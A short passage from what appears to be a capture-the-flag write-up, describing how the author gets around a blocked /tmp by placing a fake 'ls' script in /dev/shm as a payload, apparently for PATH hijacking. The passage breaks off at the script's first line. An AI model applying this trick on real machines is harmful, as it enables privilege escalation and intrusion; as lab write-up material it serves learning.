...
**The challange makers were clever they blocked tmp so we can't use but ther is a folder called shm in dev which stores things in memory and will be vanished after a restart.Lets use that and make a file named ls and put or payload in it:**
<br><br>
```
#!/bin/sh  
